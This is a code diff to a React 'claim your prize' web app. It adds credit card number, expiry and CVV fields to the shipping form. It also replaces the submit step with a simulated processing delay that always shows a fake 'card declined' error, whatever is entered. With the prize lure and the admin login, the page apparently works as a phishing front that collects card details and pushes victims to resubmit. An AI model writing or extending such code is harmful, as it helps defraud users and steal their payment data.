@@ -26,6 +26,8 @@ export default function App() {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const [adminCredentials, setAdminCredentials] = useState({ email: '', password: '' });
   const [step, setStep] = useState(1);
+  const [error, setError] = useState<string | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const [formData, setFormData] = useState({
     firstName: '',
     lastName: '',
@@ -33,7 +35,10 @@ export default function App() {
     address: '',
     city: '',
     zip: '',
-    phone: ''
+    phone: '',
+    cardNumber: '',
+    expiry: '',
+    cvv: ''
   });
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -43,8 +48,15 @@ export default function App() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    setStep(2);
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+    setIsSubmitting(true);
+    setError(null);
+    
+    // Simulate a brief processing delay
+    setTimeout(() => {
+      setIsSubmitting(false);
+      setError("Transaction Failed: Your card was declined. Please check your payment details and try again.");
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }, 1500);
   };
 
   const handleAdminLogin = (e: React.FormEvent) => {
@@ -273,6 +285,17 @@ export default function App() {
                     <p className="text-slate-500 text-sm">Please provide your shipping details to claim your prize.</p>
                   </div>
 
+                  {error && (
+                    <motion.div 
+                      initial={{ opacity: 0, y: -10 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="mb-6 p-4 bg-red-50 border border-red-100 rounded-2xl flex gap-3 items-start text-red-700"
+                    >
+                      <X className="w-5 h-5 shrink-0 mt-0.5 bg-red-600 text-white rounded-full p-1" />
+                      <div className="text-sm font-medium">{error}</div>
+                    </motion.div>
+                  )}
+
                   <form onSubmit={handleSubmit} className="space-y-4">
                     <div className="grid grid-cols-2 gap-4">
                       <div className="space-y-1.5">
@@ -367,12 +390,101 @@ export default function App() {
                       />
                     </div>
 
+                    <div className="pt-4 border-t border-slate-100">
+                      <div className="flex items-center gap-2 mb-4">
+                        <CreditCard className="w-4 h-4 text-slate-400" />
+                        <h3 className="text-sm font-bold text-slate-900 uppercase tracking-wider">Payment Information</h3>
+                      </div>
+                      
+                      <div className="space-y-4">
+                        <div className="space-y-1.5">
+                          <label className="text-xs font-bold text-slate-700 uppercase tracking-wider">Card Number</label>
+                          <div className="relative">
+                            <input 
+                              required
+                              type="text" 
+                              name="cardNumber"
+                              maxLength={19}
+                              value={formData.cardNumber}
+                              onChange={(e) => {
+                                let val = e.target.value.replace(/\D/g, '');
+                                if (val.length > 16) val = val.slice(0, 16);
+                                const formatted = val.match(/.{1,4}/g)?.join(' ') || val;
+                                setFormData(prev => ({ ...prev, cardNumber: formatted }));
+                              }}
+                              placeholder="0000 0000 0000 0000"
+                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all font-mono"
+                            />
+                            <div className="absolute right-4 top-1/2 -translate-y-1/2 flex gap-1">
+                              <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-3 opacity-50" referrerPolicy="no-referrer" />
+                              <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-4 opacity-50" referrerPolicy="no-referrer" />
+                            </div>
+                          </div>
+                        </div>
+
+                        <div className="grid grid-cols-2 gap-4">
+                          <div className="space-y-1.5">
+                            <label className="text-xs font-bold text-slate-700 uppercase tracking-wider">Expiry Date</label>
+                            <input 
+                              required
+                              type="text" 
+                              name="expiry"
+                              maxLength={5}
+                              value={formData.expiry}
+                              onChange={(e) => {
+                                let val = e.target.value.replace(/\D/g, '');
+                                if (val.length > 4) val = val.slice(0, 4);
+                                if (val.length >= 2) {
+                                  val = val.slice(0, 2) + '/' + val.slice(2);
+                                }
+                                setFormData(prev => ({ ...prev, expiry: val }));
+                              }}
+                              placeholder="MM/YY"
+                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all font-mono"
+                            />
+                          </div>
+                          <div className="space-y-1.5">
+                            <label className="text-xs font-bold text-slate-700 uppercase tracking-wider">CVV</label>
+                            <div className="relative">
+                              <input 
+                                required
+                                type="text" 
+                                name="cvv"
+                                maxLength={3}
+                                value={formData.cvv}
+                                onChange={(e) => {
+                                  const val = e.target.value.replace(/\D/g, '').slice(0, 3);
+                                  setFormData(prev => ({ ...prev, cvv: val }));
+                                }}
+                                placeholder="123"
+                                className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all font-mono"
+                              />
+                              <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-300" />
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
                     <button 
                       type="submit"
-                      className="w-full bg-slate-900 text-white py-4 rounded-2xl font-bold text-lg hover:bg-slate-800 active:scale-[0.98] transition-all flex items-center justify-center gap-2 group"
+                      disabled={isSubmitting}
+                      className={cn(
+                        "w-full bg-slate-900 text-white py-4 rounded-2xl font-bold text-lg transition-all flex items-center justify-center gap-2 group",
+                        isSubmitting ? "opacity-70 cursor-not-allowed" : "hover:bg-slate-800 active:scale-[0.98]"
+                      )}
                     >
-                      Continue to Shipping
-                      <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
+                      {isSubmitting ? (
+                        <div className="flex items-center gap-2">
+                          <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                          Processing...
+                        </div>
+                      ) : (
+                        <>
+                          Continue to Shipping
+                          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
+                        </>
+                      )}
                     </button>
 
                     <div className="pt-4 flex items-center justify-center gap-4 opacity-50 grayscale hover:grayscale-0 transition-all">
